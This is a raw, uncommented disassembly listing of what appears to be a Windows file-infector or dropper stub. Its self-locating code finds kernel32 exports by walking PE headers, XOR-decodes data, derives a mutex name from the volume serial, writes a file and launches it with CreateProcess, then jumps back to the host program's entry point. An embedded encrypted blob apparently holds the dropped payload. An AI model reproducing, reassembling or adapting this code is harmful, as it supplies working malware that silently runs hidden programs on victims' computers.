		push	dword ptr [ebp+2001AF47h]
		push	ebp
		lea	eax, [ebp+2001AAD3h]
		call	eax
		mov	[ebp+2001AF78h], eax
		lea	eax, [ebp+2001AF58h]
		push	eax
		push	dword ptr [ebp+2001AF47h]
		push	ebp
		lea	eax, [ebp+2001AAD3h]
		call	eax
		mov	[ebp+2001AF7Ch], eax

loc_10340C8:				; CODE XREF: start+65j	start+6Ej ...
		cmp	dword ptr [ebp+2001AF7Ch], 0
		jz	loc_10341E7
		cmp	dword ptr [ebp+2001AF78h], 0
		jz	loc_10341E7
		lea	eax, [ebp+2001AF84h]
		push	eax
		call	dword ptr [ebp+2001AF78h]
		cmp	eax, 0
		jz	loc_10341E7
		mov	[ebp+2001AF47h], eax
		lea	eax, [ebp+2001AF67h]
		push	eax
		push	dword ptr [ebp+2001AF47h]
		call	dword ptr [ebp+2001AF7Ch]
		cmp	eax, 0
		jz	loc_10341DB
		mov	[ebp+2001AF80h], eax
		lea	eax, [ebp+2001B018h]
		push	eax
		lea	eax, [ebp+2001AF84h]
		push	eax
		push	ebp
		lea	eax, [ebp+2001AA1Dh]
		call	eax
		cmp	eax, 0
		jz	loc_10341DB
		push	ebp
		lea	eax, [ebp+2001AD1Ah]
		call	eax
		or	eax, eax
		jnz	loc_10341DB
		push	dword ptr [ebp+2001AE17h]
		lea	eax, [ebp+2001AE1Bh]
		push	eax
		push	dword ptr [ebp+2001B03Ch]
		lea	eax, [ebp+2001B040h]
		inc	eax
		push	eax
		lea	eax, [ebp+2001A8C6h]
		call	eax
		push	0FFh
		lea	eax, [ebp+2001AE37h]
		push	eax
		push	0
		call	dword ptr [ebp+2001B02Ch]
		mov	ecx, eax
		lea	ebx, [ebp+2001AE37h]
		add	eax, ebx
		std
		mov	edi, eax
		mov	al, 2Eh
		repne scasb
		inc	edi
		cld
		lea	esi, [ebp+2001AE2Fh]
		mov	ecx, 8
		rep movsb
		push	dword ptr [ebp+2001B03Ch]
		lea	ebx, [ebp+2001B040h]
		inc	ebx
		push	ebx
		lea	eax, [ebp+2001AE37h]
		push	eax
		push	ebp
		lea	eax, [ebp+2001AD4Dh]
		call	eax
		cmp	eax, 1
		jnz	short loc_10341DB
		lea	eax, [ebp+2001AE37h]
		push	eax
		push	ebp
		lea	eax, [ebp+2001ADA8h]
		call	eax

loc_10341DB:				; CODE XREF: start+114j start+13Aj ...
		push	dword ptr [ebp+2001AF47h]
		call	dword ptr [ebp+2001B018h]

loc_10341E7:				; CODE XREF: start+25j	start+CFj ...
		mov	eax, [ebp+2001AE0Bh]
		sub	eax, [ebp+2001AE13h]
		mov	[esp+20h+var_4], eax
		popa
		jmp	eax
start		endp

; ---------------------------------------------------------------------------
		push	ebp
		mov	ebp, esp
		mov	ebx, [ebp+8]
		push	dword ptr [ebp+0Ch]
		push	0
		push	1
		call	dword ptr [ebx+2001B01Ch]
		or	eax, eax
		jz	short locret_1034220
		mov	ebx, [ebp+8]
		push	eax
		call	dword ptr [ebx+2001B020h]
		mov	eax, 1

locret_1034220:				; CODE XREF: .text:0103420Fj
		leave
		retn	8
; ---------------------------------------------------------------------------
		push	ebp
		mov	ebp, esp
		mov	ecx, [ebp+0Ch]
		mov	edi, [ebp+8]
		mov	esi, [ebp+10h]
		mov	edx, 0

loc_1034235:				; CODE XREF: .text:01034246j
		or	edx, edx
		jnz	short loc_103423D
		mov	edx, [ebp+14h]
		dec	edx

loc_103423D:				; CODE XREF: .text:01034237j
		mov	bl, [edx+esi]
		xor	bl, [edi]
		mov	[edi], bl
		inc	edi
		dec	edx
		loop	loc_1034235
		leave
		retn	10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_103424C	proc near		; CODE XREF: .text:0103462Cp
					; .text:01034653p

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		push	esi
		push	edi
		push	ebx
		push	edx
		push	ecx
		mov	edi, [ebp+arg_4]
		mov	ecx, 8
		cmp	ecx, [ebp+arg_8]
		jbe	short loc_103426D
		sub	ecx, [ebp+arg_8]

loc_1034264:				; CODE XREF: sub_103424C+1Cj
		rol	[ebp+arg_0], 4
		loop	loc_1034264
		mov	ecx, [ebp+arg_8]

loc_103426D:				; CODE XREF: sub_103424C+13j
					; sub_103424C+3Ej
		rol	[ebp+arg_0], 4
		mov	eax, [ebp+arg_0]
		and	eax, 0Fh
		cmp	eax, 0
		jb	short loc_1034285
		cmp	eax, 9
		ja	short loc_1034285
		add	al, 30h
		jmp	short loc_1034287
; ---------------------------------------------------------------------------

loc_1034285:				; CODE XREF: sub_103424C+2Ej
					; sub_103424C+33j
		add	al, 37h

loc_1034287:				; CODE XREF: sub_103424C+37j
		mov	[edi], al
		inc	edi
		loop	loc_103426D
		mov	eax, edi
		pop	ecx
		pop	edx
		pop	ebx
		pop	edi
		pop	esi
		leave
		retn	0Ch
sub_103424C	endp

; ---------------------------------------------------------------------------
		push	ebp
		mov	ebp, esp
		push	ebx
		push	ecx
		mov	eax, [ebp+8]
		xor	edx, edx
		mov	ecx, 1F31Dh
		div	ecx
		mov	ecx, eax
		mov	eax, 41A7h
		mul	edx
		mov	edx, ecx
		mov	ecx, eax
		mov	eax, 0B14h
		mul	edx
		sub	ecx, eax
		xor	edx, edx
		mov	eax, ecx
		mov	ebx, ecx
		div	dword ptr [ebp+0Ch]
		mov	eax, edx
		mov	edx, ebx
		pop	ecx
		pop	ebx
		leave
		retn	8
; ---------------------------------------------------------------------------
		push	ebp
		mov	ebp, esp
		push	esi
		push	edi
		push	ecx
		push	ebx
		push	edx
		mov	eax, 0
		cmp	dword ptr [ebp+0Ch], 0
		jbe	short loc_10342FF
		cld
		mov	ecx, [ebp+0Ch]
		mov	edi, [ebp+8]
		mov	al, [ebp+10h]
		repne scasb
		dec	edi
		mov	al, [edi]
		cmp	al, [ebp+10h]
		jz	short loc_10342FD
		mov	edi, 0

loc_10342FD:				; CODE XREF: .text:010342F6j
		mov	eax, edi

loc_10342FF:				; CODE XREF: .text:010342E2j
		pop	edx
		pop	ebx
		pop	ecx
		pop	edi
		pop	esi
		leave
		retn	0Ch
; ---------------------------------------------------------------------------
		push	ebp
		mov	ebp, esp
		push	ebx
		push	edx
		push	esi
		push	edi
		push	ecx
		mov	eax, 0
		cmp	dword ptr [ebp+8], 0
		jz	short loc_103432C
		mov	ecx, 0FFFFFFFFh
		mov	edi, [ebp+8]
		mov	al, 0
		repne scasb
		mov	eax, ecx
		not	eax
		dec	eax

loc_103432C:				; CODE XREF: .text:01034319j
		pop	ecx
		pop	edi
		pop	esi
		pop	edx
		pop	ebx
		leave
		retn	4
; ---------------------------------------------------------------------------
		push	ebp
		mov	ebp, esp
		push	ebx
		push	edx
		push	esi
		push	edi
		push	ecx
		mov	eax, 0FFFFFFFFh
		cmp	dword ptr [ebp+8], 0
		jz	short loc_1034372
		cmp	dword ptr [ebp+0Ch], 0
		jz	short loc_1034372
		mov	edi, [ebp+8]
		mov	esi, [ebp+0Ch]

loc_1034354:				; CODE XREF: .text:01034370j
		mov	al, [edi]
		mov	bl, [esi]
		or	al, al
		jz	short loc_1034364
		or	bl, bl
		jz	short loc_1034364
		cmp	bl, al
		jz	short loc_103436E

loc_1034364:				; CODE XREF: .text:0103435Aj
					; .text:0103435Ej
		movzx	eax, al
		movzx	ebx, bl
		sub	eax, ebx
		jmp	short loc_1034372
; ---------------------------------------------------------------------------

loc_103436E:				; CODE XREF: .text:01034362j
		inc	esi
		inc	edi
		jmp	short loc_1034354
; ---------------------------------------------------------------------------

loc_1034372:				; CODE XREF: .text:01034346j
					; .text:0103434Cj ...
		pop	ecx
		pop	edi
		pop	esi
		pop	edx
		pop	ebx
		leave
		retn	8
; ---------------------------------------------------------------------------
		push	ebp
		mov	ebp, esp
		add	esp, 0FFFFFFF8h
		push	esi
		push	edi
		push	ebx
		push	0
		pop	dword ptr [ebp-8]
		mov	ebx, [ebp+8]
		push	dword ptr [ebp+0Ch]
		call	dword ptr [ebx+2001AF80h]
		or	eax, eax
		jnz	short loc_10343A5
		mov	ebx, [ebp+8]
		push	dword ptr [ebp+0Ch]
		call	dword ptr [ebx+2001AF78h]

loc_10343A5:				; CODE XREF: .text:01034397j
		or	eax, eax
		jz	short loc_10343E8
		mov	[ebp-4], eax
		mov	edi, [ebp+0Ch]
		mov	esi, [ebp+10h]

loc_10343B2:				; CODE XREF: .text:010343E1j
		mov	ebx, [ebp+8]
		push	edi
		lea	eax, [ebx+2001A9AAh]
		call	eax
		add	edi, eax
		inc	edi
		cmp	byte ptr [edi],	0
		jz	short loc_10343E3
		push	esi
		push	edi
		mov	ebx, [ebp+8]
		push	edi
		push	dword ptr [ebp-4]
		call	dword ptr [ebx+2001AF7Ch]
		pop	edi
		pop	esi
		cmp	eax, 0
		jz	short loc_10343E8
		mov	[esi], eax
		add	esi, 4
		jmp	short loc_10343B2
; ---------------------------------------------------------------------------

loc_10343E3:				; CODE XREF: .text:010343C4j
		push	1
		pop	dword ptr [ebp-8]

loc_10343E8:				; CODE XREF: .text:010343A7j
					; .text:010343DAj
		mov	eax, [ebp-8]
		pop	ebx
		pop	edi
		pop	esi
		leave
		retn	0Ch
; ---------------------------------------------------------------------------
		push	ebp
		mov	ebp, esp
		push	edi
		push	esi
		mov	edi, [ebp+8]
		and	edi, 0FFFF0000h

loc_1034400:				; CODE XREF: .text:01034422j
		cmp	word ptr [edi],	5A4Dh
		jnz	short loc_1034416
		mov	esi, edi
		add	esi, [edi+3Ch]
		cmp	dword ptr [esi], 4550h
		jnz	short loc_1034416
		jmp	short loc_1034429
; ---------------------------------------------------------------------------

loc_1034416:				; CODE XREF: .text:01034405j
					; .text:01034412j
		sub	edi, 10000h
		cmp	edi, 70000000h
		jnb	short loc_1034400
		mov	edi, 0

loc_1034429:				; CODE XREF: .text:01034414j
		mov	eax, edi
		pop	esi
		pop	edi
		leave
		retn	4
; ---------------------------------------------------------------------------
		push	ebp
		mov	ebp, esp
		add	esp, 0FFFFFFFCh
		push	esi
		push	edi
		push	ecx
		push	edx
		push	ebx
		push	0
		pop	dword ptr [ebp-4]
		mov	edi, [ebp+0Ch]
		cmp	word ptr [edi],	5A4Dh
		jnz	short loc_10344BC
		add	edi, [edi+3Ch]
		cmp	dword ptr [edi], 4550h
		jnz	short loc_10344BC
		lea	edx, [edi+78h]
		mov	edi, [edx]
		or	edi, edi
		jz	short loc_10344BC
		add	edi, [ebp+0Ch]
		mov	ebx, [ebp+8]
		xor	ecx, ecx
		mov	esi, [edi+20h]
		add	esi, [ebp+0Ch]

loc_103446D:				; CODE XREF: .text:0103448Bj
		mov	eax, [esi+ecx*4]
		or	eax, eax
		jz	short loc_1034487
		add	eax, [ebp+0Ch]
		push	dword ptr [ebp+10h]
		push	eax
		lea	eax, [ebx+2001A9D7h]
		call	eax
		test	eax, eax
		jz	short loc_103448D

loc_1034487:				; CODE XREF: .text:01034472j
		inc	ecx
		cmp	ecx, [edi+18h]
		jb	short loc_103446D

loc_103448D:				; CODE XREF: .text:01034485j
		cmp	ecx, [edi+18h]
		jnb	short loc_10344BC
		mov	esi, [edi+24h]
		add	esi, [ebp+0Ch]
		movzx	eax, word ptr [esi+ecx*2]
		mov	esi, [edi+1Ch]
		add	esi, [ebp+0Ch]
		mov	eax, [esi+eax*4]
		or	eax, eax
		jz	short loc_10344BC
		add	eax, [ebp+0Ch]
		mov	ecx, [edx]
		add	ecx, [edx+4]
		cmp	eax, [edx]
		jb	short loc_10344B9
		cmp	eax, ecx
		jbe	short loc_10344BC

loc_10344B9:				; CODE XREF: .text:010344B3j
		mov	[ebp-4], eax

loc_10344BC:				; CODE XREF: .text:01034449j
					; .text:01034454j ...
		mov	eax, [ebp-4]
		pop	ebx
		pop	edx
		pop	ecx
		pop	edi
		pop	esi
		leave
		retn	0Ch
; ---------------------------------------------------------------------------
		push	ebp
		mov	ebp, esp
		add	esp, 0FFFFFED8h
		push	ebx
		push	edx
		push	ecx
		push	edi
		push	esi
		push	0
		pop	dword ptr [ebp-128h]
		mov	ebx, [ebp+8]
		push	104h
		lea	eax, [ebp-106h]
		push	eax
		call	dword ptr [ebx+2001B034h]
		or	eax, eax
		jz	loc_1034669
		mov	ebx, [ebp+8]
		push	3Ah
		push	eax
		lea	eax, [ebp-106h]
		push	eax
		lea	eax, [ebx+2001A973h]
		call	eax
		or	eax, eax
		jz	loc_1034669
		inc	eax
		mov	byte ptr [eax],	5Ch
		inc	eax
		mov	byte ptr [eax],	0
		push	0
		pop	dword ptr [ebp-10Ch]
		mov	ebx, [ebp+8]
		push	0
		push	0
		push	0
		push	0
		lea	eax, [ebp-10Ch]
		push	eax
		push	0
		push	0
		lea	eax, [ebp-106h]
		push	eax
		call	dword ptr [ebx+2001B038h]
		mov	ebx, [ebp+8]
		push	0FFFFFFFFh
		push	dword ptr [ebp-10Ch]
		lea	eax, [ebx+2001A939h]
		call	eax
		add	eax, [ebp+0Ch]
		mov	[ebp-124h], eax
		push	0FFFFh
		push	edx
		lea	eax, [ebx+2001A939h]
		call	eax
		movzx	eax, ax
		mov	[ebp-120h], eax
		push	0FFFFh
		push	edx
		lea	eax, [ebx+2001A939h]
		call	eax
		movzx	eax, ax
		mov	[ebp-11Ch], eax
		push	0FFFFh
		push	edx
		lea	eax, [ebx+2001A939h]
		call	eax
		movzx	eax, ax
		mov	[ebp-118h], eax
		push	0FFFFFFFFh
		push	edx
		lea	eax, [ebx+2001A939h]
		call	eax
		add	eax, [ebp+10h]
		mov	[ebp-114h], eax
		push	0FFFFh
		push	edx
		lea	eax, [ebx+2001A939h]
		call	eax
		movzx	eax, ax
		mov	[ebp-110h], eax
		mov	edi, [ebp+14h]
		mov	byte ptr [edi],	7Bh
		inc	edi
		push	8
		push	edi
		push	dword ptr [ebp-124h]
		lea	eax, [ebx+2001A8EEh]
		call	eax
		mov	edi, eax
		mov	byte ptr [edi],	2Dh
		inc	edi
		push	4
		push	edi
		push	dword ptr [ebp-120h]
		lea	eax, [ebx+2001A8EEh]
		call	eax
		mov	edi, eax
		mov	byte ptr [edi],	2Dh
		inc	edi
		push	4
		push	edi
		push	dword ptr [ebp-11Ch]
		lea	eax, [ebx+2001A8EEh]
		call	eax
		mov	edi, eax
		mov	byte ptr [edi],	2Dh
		inc	edi
		push	4
		push	edi
		push	dword ptr [ebp-118h]
		call	sub_103424C
		mov	edi, eax
		mov	byte ptr [edi],	2Dh
		inc	edi
		push	8
		push	edi
		push	dword ptr [ebp-114h]
		lea	eax, [ebx+2001A8EEh]
		call	eax
		mov	edi, eax
		push	4
		push	edi
		push	dword ptr [ebp-110h]
		call	sub_103424C
		mov	edi, eax
		mov	byte ptr [edi],	7Dh
		inc	edi
		mov	byte ptr [edi],	0
		push	1
		pop	dword ptr [ebp-128h]

loc_1034669:				; CODE XREF: .text:010344F5j
					; .text:01034512j
		mov	eax, [ebp-128h]
		pop	esi
		pop	edi
		pop	ecx
		pop	edx
		pop	ebx
		leave
		retn	10h
; ---------------------------------------------------------------------------
		push	ebp
		mov	ebp, esp
		add	esp, 0FFFFFFD8h
		mov	ebx, [ebp+8]
		lea	eax, [ebp-28h]
		push	eax
		push	0
		push	7F3h
		push	ebx
		lea	eax, [ebx+2001AB6Ah]
		call	eax
		cmp	eax, 1
		jnz	short locret_10346A7
		lea	eax, [ebp-28h]
		push	eax
		push	ebx
		lea	eax, [ebx+2001A89Ch]
		call	eax

locret_10346A7:				; CODE XREF: .text:01034698j
		leave
		retn	4
; ---------------------------------------------------------------------------
		push	ebp
		mov	ebp, esp
		add	esp, 0FFFFFFFCh
		mov	ebx, [ebp+8]
		push	0
		push	80h
		push	2
		push	0
		push	2
		push	40000000h
		push	dword ptr [ebp+0Ch]
		call	dword ptr [ebx+2001B024h]
		cmp	eax, 0FFFFFFFFh
		jz	short loc_10346FD
		push	eax
		mov	edx, eax
		mov	ebx, [ebp+8]
		push	0
		lea	eax, [ebp-4]
		push	eax
		push	dword ptr [ebp+14h]
		push	dword ptr [ebp+10h]
		push	edx
		call	dword ptr [ebx+2001B028h]
		mov	ebx, [ebp+8]
		call	dword ptr [ebx+2001B020h]
		mov	eax, 1
		jmp	short locret_1034702
; ---------------------------------------------------------------------------

loc_10346FD:				; CODE XREF: .text:010346D2j
		mov	eax, 0

locret_1034702:				; CODE XREF: .text:010346FBj
		leave
		retn	10h
; ---------------------------------------------------------------------------
		push	ebp
		mov	ebp, esp
		add	esp, 0FFFFFFACh
		mov	ebx, [ebp+8]
		cld
		mov	ecx, 44h
		lea	edi, [ebp-44h]
		mov	al, 0
		rep stosb
		mov	ecx, 10h
		lea	edi, [ebp-54h]
		mov	al, 0
		rep stosb
		lea	eax, [ebp-54h]
		push	eax
		lea	eax, [ebp-44h]
		push	eax
		push	0
		push	0
		push	0
		push	0
		push	0
		push	0
		push	dword ptr [ebp+0Ch]
		push	0
		call	dword ptr [ebx+2001B030h]
		mov	ebx, [ebp+8]
		lea	edi, [ebp-54h]
		push	dword ptr [edi]
		push	dword ptr [edi+4]
		call	dword ptr [ebx+2001B020h]
		mov	ebx, [ebp+8]
		call	dword ptr [ebx+2001B020h]
		leave
		retn	8
; ---------------------------------------------------------------------------
		align 4
		dd 0
		dd 600h, 3289300h, 1400h, 0E1D09A00h, 0C12D3070h, 21090796h
		dd 4F485346h, 6179AC64h, 72676DB4h, 6578652Eh, 41h dup(0)
		dd 32F5C00h, 32FCC00h, 32FDC00h, 0
		dd 616F4C00h, 62694C64h, 79726172h, 65470041h, 6F725074h
		dd 64644163h, 73736572h, 74654700h, 75646F4Dh, 6148656Ch
		dd 656C646Eh, 41h, 2 dup(0)
		dd 656B0000h, 6C656E72h, 642E3233h, 46006C6Ch, 4C656572h
		dd 61726269h, 4F007972h, 4D6E6570h, 78657475h, 6C430041h
		dd 4865736Fh, 6C646E61h, 72430065h, 65746165h, 656C6946h
		dd 72570041h, 46657469h, 656C69h, 4D746547h, 6C75646Fh
		dd 6C694665h, 6D614E65h, 43004165h, 74616572h, 6F725065h
		dd 73736563h, 65470041h, 6E695774h, 73776F64h, 65726944h
		dd 726F7463h, 47004179h, 6F567465h, 656D756Ch, 6F666E49h
		dd 74616D72h, 416E6F69h, 9 dup(0)
		dd 0F6000000h, 0F9010001h, 67ACE93Bh, 4253484Fh, 69070921h
		dd 0C8302D3Eh, 61B4D0E1h, 0F64AC79h, 21465348h,	0C1960709h
		dd 9770302Dh, 797A0259h, 484F64ACh, 9214653h, 2DC19607h
		dd 0D0E17030h, 247961B4h, 5A484F64h, 0CFCCD49Ch, 0C0082BB2h
		dd 1AEBD75h, 2E566937h,	4CD76FDCh, 4A1CC9CAh, 7CFBA9E3h
		dd 6F05D5AEh, 0ED605292h, 7A6D28F7h, 0A6E53F9Fh, 0C9CEA30Eh
		dd 6C0BC94Ah, 9858A515h, 2631FAA7h, 2DCD7049h, 0D0E17030h
		dd 0FC7961B4h, 1F484F21h, 67092247h, 3017C3DEh,	0B4D0E170h
		dd 84AC7961h, 4D52474Fh, 96030E20h, 70302CF1h, 61B4D061h
		dd 0F64AFD9h, 2146579Ah, 0C19604B9h, 0E17034CDh, 7961F4D0h
		dd 484F64BCh, 0C214651h, 2AC19607h, 0D4E17230h,	0AC7961B4h
		dd 53484F64h, 7092766h,	302DC186h, 0B6D0E170h, 64AC7961h
		dd 4653584Fh, 96070931h, 70303DC1h, 61B4D0F1h, 5F64AC79h
		dd 21465348h, 0C1960709h, 9570302Dh, 9D61B188h,	484F64ACh
		dd 92142B3h, 2DC19747h,	0D0E17030h, 0AC7961B4h,	53484F64h
		dd 7092146h, 302DC196h,	0B4D0E170h, 64AC7961h, 4653484Fh
		dd 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h
		dd 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 31AC7961h, 4663101Fh,	96070921h
		dd 70302E61h, 61B4D0F1h, 4F64AC79h, 2146534Ah, 0C1960709h
		dd 0E170302Dh, 0F961B4D0h, 1DAF64ACh, 9101E03h,	2DC19607h
		dd 0D0E17100h, 0AC796204h, 53484E40h, 7092144h,	302DC196h
		dd 0B4D0E170h, 24AC7961h, 68B3484Fh, 0F5757A53h, 70302DC1h
		dd 61B4D1A1h, 4F64A899h, 21465398h, 0C196062Fh,	0E170302Dh
		dd 7961B4D0h, 284F64ACh, 3AC14653h, 2DF2A629h, 0F1B92065h
		dd 0A47B68B9h, 8E46B8B6h, 198B1499h, 302973C2h,	0B4D1C350h
		dd 64AE1691h, 39534869h, 69F8F6FCh, 0F3DCA694h,	9E4C00Dh
		dd 4F03F53Fh, 8949ED20h, 0C196EFE1h, 4FB3B3Dh, 0F878778Dh
		dd 0B5F09B53h, 0F6DF8297h, 2DD07FF8h, 3BA11A14h, 88759EB7h
		dd 536C73E7h, 0F851D633h, 75A039E3h, 3091A8Bh, 27DB4C81h
		dd 90638E43h, 9F076361h, 78E7DAD0h, 664B3C9Ch, 0C2AC273Bh
		dd 7317A705h, 99AB9561h, 2A7314C1h, 829E6B27h, 9A6AE31Bh
		dd 61D1051Dh, 5AA3A04Ah, 20AC3C60h, 261C09E5h, 9C903088h
		dd 451ED8A8h, 0BBF2E4DCh, 0D9B38987h, 0D4B31004h, 172EC730h
		dd 0D1CA60DFh, 77E8DA8Ah, 297B5BE4h, 41A37751h,	66965033h
		dd 818CD63Bh, 9820F82Eh, 66026DA6h, 0CB900C40h,	0AFAB1CDh
		dd 0FE368FF6h, 0AD0CF376h, 502F4C4Fh, 0A31DC235h, 6938136Eh
		dd 0E8A7CDA2h, 502D6A7Fh, 46A46B09h, 4574CEB2h,	0ACF782E0h
		dd 8F87F63Fh, 8DC1AE2h,	1D649E09h, 56273767h, 8DC4A842h
		dd 50D7581Bh, 0A05C5609h, 5FB89DF4h, 82DE0470h,	0C1BFDDFFh
		dd 0B83B8F3Dh, 0AC083882h, 0F875ED61h, 4F4A09A6h, 0F37E95FEh
		dd 0BC061FBEh, 5FC48D7Bh, 0D9D75494h, 68E89AE3h, 0B8E89D2Dh
		dd 96C7DAAh, 6307C22Ch,	113D3BA0h, 84DB0F6h, 2BA3E322h
		dd 1E46C1B8h, 3B7855C4h, 0C502E11h, 5FDACE9Bh, 2762BEB4h
		dd 6EFA7E6Fh, 1D762861h, 0D15BF8B1h, 827D3138h,	7F3C9CFCh
		dd 99E8FC95h, 0B450CFB7h, 0D764CFAAh, 5BF3D4DAh, 407BF0D2h
		dd 0FFDAC4Dh, 7F984251h, 8B558C17h, 172161C1h, 0FA358098h
		dd 0BE772AB9h, 0E54A2090h, 3F3F1D3Ah, 671F3FF1h, 75D1FC33h
		dd 7503801Fh, 637E630Ch, 0C157D6FEh, 0D50A3AD5h, 277DE1AEh
		dd 17F79B91h, 50E846DDh, 36755D7Fh, 0B5AC95DBh,	0AA23B3EFh
		dd 6B0C3038h, 2C2590C0h, 0EF035645h, 5F991D81h,	29B610E4h
		dd 0C2FA61BFh, 0CDE472BAh, 99D2F57Dh, 0B4213CD9h, 8D951852h
		dd 0E65BDD8Eh, 13C01BA9h, 0A796A954h, 283F111Bh, 89CFA99Bh
		dd 453A84BFh, 0C47E0280h, 129C801Fh, 94928F0Bh,	0DA32348Ah
		dd 74FE1479h, 0C89474F3h, 0B80ACFAAh, 7299B48Ah, 6D420214h
		dd 0A079E125h, 9B7B24Dh, 90371B71h, 9A451F8Ch, 0FF66A5A7h
		dd 521597C7h, 0F3BE8953h, 0BDB48935h, 0C5383EF7h, 0D64E4124h
		dd 0A70168FEh, 0EC55E83Fh, 0B025794Dh, 6F448B47h, 0AE256C4Bh
		dd 5D3DC5Ah, 2B15F881h,	953239E2h, 1E8BA02Eh, 0FC79B921h
		dd 0F5D4F97Eh, 0C4AEFCA3h, 0ACF5F0E0h, 3F605405h, 481883FEh
		dd 54D29370h, 6943F109h, 97FD52A8h, 60CDE497h, 0EF696F39h
		dd 22070077h, 0C7C258E1h, 0AC04BE4Bh, 4E628ACBh, 0AEA6F76Ah
		dd 9BBEE5BFh, 0B87C293Ah, 99F977A0h, 6AC9486Eh,	2F1E7507h
		dd 0A4B03C4Bh, 0B87D156Bh, 2FADC0CAh, 3B25E02h,	0D4B662F8h
		dd 0F8899201h, 42FB6DA6h, 21EAF6E0h, 7B50551Ch,	55B680C1h
		dd 0D9484990h, 0CC225955h, 2CA66329h, 1CCFDEC8h, 71519DAFh
		dd 1E91C50Fh, 2B492BDBh, 7155570Fh, 0EF694025h,	0D2BCDCBEh
		dd 0B8F8D088h, 12A94A5Bh, 0C1E2AFDh, 4AB36A28h,	601B0F9Eh
		dd 63E4A2Bh, 8A5A0841h,	64503AA1h, 0C21DEB82h, 0D2A049DFh
		dd 0FA20C523h, 4902616h, 0F546F609h, 1D8F22B9h,	7849AC6Bh
		dd 62476F9Ah, 7E0BF091h, 1CD622FBh, 3A3788D0h, 5586822Ah
		dd 0B16FEE6Ah, 50FD274Eh, 0E842BB9Dh, 87AB473h,	75D57C92h
		dd 9B283C27h, 0BD1C0BF7h, 5583FC33h, 9D5D9B41h,	949E64h
		dd 0E4AD3533h, 2C5CE2E0h, 545C88ECh, 85636D92h,	0A1E6A81h
		dd 0B0C08407h, 0DF33BD1Ch, 0A87A72B6h, 818563F9h, 130C2703h
		dd 0E2E0C690h, 0BCB87CEDh, 6A9B7024h, 949A4C45h, 9A0C25BCh
		dd 0B93D3A8Dh, 6F69FC33h, 616BECD7h, 0FC6A8158h, 0D3DA16D0h
		dd 0F46313A6h, 0B0B869FCh, 5E4971B8h, 0C0364332h, 355C0BD5h
		dd 0E6FA69B4h, 75A0B8AEh, 4F6154BDh, 199B3C2Eh,	0E9E40812h
		dd 54E7FEA9h, 0F94E98D4h, 0A59A9563h, 730B39C5h, 0B9F9E427h
		dd 86B3EE33h, 0EAFB4591h, 0B7ACB253h, 0F1903785h, 4123819h
		dd 0EB6A4BCDh, 6E8A6C4Ch, 0B8A9AF8Ch, 9394AD62h, 12FDE30Dh
		dd 0CA3AAF83h, 0D0AD2051h, 9B2D9326h, 35B15D0Ah, 28C5E076h
		dd 6830E5FDh, 0DA5C6C5Bh, 9B9B95BDh, 0A93E24C0h, 4F2AA738h
		dd 6667B7DFh, 4AC13B4Ch, 6E93DEC4h, 48F69701h, 4498023Ch
		dd 5BBC48E2h, 692B2632h, 0DBB26CCCh, 934EF3Eh, 0FC4D0578h
		dd 0AC956AE7h, 31017DDDh, 1470F8F3h, 0A0CC137Ah, 4FB240Fh
		dd 0BA3BB795h, 0B65A6333h, 8CCE42E3h, 5010FD0Ch, 862AF471h
		dd 8B716401h, 0CBA7A3E4h, 287E3E4Fh, 6DA87D19h,	0D44368A8h
		dd 47C63ACFh, 0E10A8DA1h, 0A78FE6FDh, 2F5B98D4h, 0CE90E78Fh
		dd 0C1FFEC7Ch, 36775CFEh, 0A1D7EC1Ah, 487EB44Dh, 545A4D47h
		dd 5B2BEA2Bh, 433B3413h, 0B8675BEDh, 0DDF908A0h, 0BB566347h
		dd 8AB1603Dh, 54622120h, 30D2B2C3h, 0D5C4101Fh,	0DB08DB5Ch
		dd 3A5BAC4Ah, 0F97CFB31h, 75A0AEBDh, 6D5355ADh,	360D9D5Ah
		dd 0D11119CFh, 0F5B424F8h, 801CE705h, 906A5E75h, 7353775Bh
		dd 2D234DA1h, 8CBCC064h, 4A1353F8h, 0AA24D8E6h,	49372F79h
		dd 8EF09142h, 169EFCBFh, 0C1AE1913h, 623A7C7Eh,	0C44D83AEh
		dd 8CC99B2Ah, 337FC9D7h, 0BC4E3975h, 0C26DEB9h,	90CE5B23h
		dd 72A43814h, 0C54D5BD3h, 2621F8CCh, 0CF2768AAh, 9D8802E9h
		dd 0FBA14C0Ch, 0DA71347Dh, 170DC365h, 44CA276Ah, 4F2BEBF0h
		dd 76C0D798h, 0DFD0BC38h, 7ECB23D8h, 412A3766h,	47354874h
		dd 2487DD83h, 0F72ED02Dh
		dd 8F15179Fh, 0B4514D9Ah, 0D86D1AADh, 0EC28E963h, 0F246F581h
		dd 0D950431h, 250343ACh, 0ED90D259h, 5402BA6Ah,	0A9CE2A53h
		dd 95FC8FE0h, 261D9C55h, 496AD7FFh, 0F86AF334h,	2C352E23h
		dd 0E0EE542Ch, 587DE8A7h, 97440231h, 2B73A238h,	68727EC9h
		dd 12C2997Bh, 0F1589D75h, 0C7A67406h, 0D4353FF4h, 92F1E442h
		dd 3360402Ah, 19EBF108h, 760C1F72h, 25BB8649h, 0E19C712Ah
		dd 81AEFF0Ch, 1B546287h, 0B58000DCh, 22CAB92Ch,	0B5627733h
		dd 0EB953F50h, 0CE6CDADFh, 0E37BF68Fh, 45E5DAC1h, 1B497404h
		dd 0E45BC416h, 9A514850h, 0AD233690h, 5A647D02h, 135C1E2Ah
		dd 51854CD4h, 66AF244Bh, 0ECB63B63h, 89869C7Fh,	0C8620169h
		dd 31C257E9h, 0FB917785h, 0D8DD183h, 0B41FABBh,	6CD5884Bh
		dd 1C0550D5h, 0F1377F4Ch, 3A3A460Fh, 32B9B9CDh,	0C37CEB58h
		dd 0ED11AA1Eh, 4E564FD6h, 60CDFBA2h, 782CC749h,	7A3099BAh
		dd 0F10F6A9Fh, 1627EFBDh, 2FDBAF24h, 0A5AEE192h, 0ED8A95D8h
		dd 403FC24Fh, 1E066633h, 4D47E1DDh, 4C42D068h, 80D233BCh
		dd 4A40C32Ch, 22E7D8E2h, 842ABC84h, 0D4088178h,	0BB1AC5D9h
		dd 0F6332F8Bh, 32E41282h, 47061E5Dh, 0DABEB818h, 5B6ABB76h
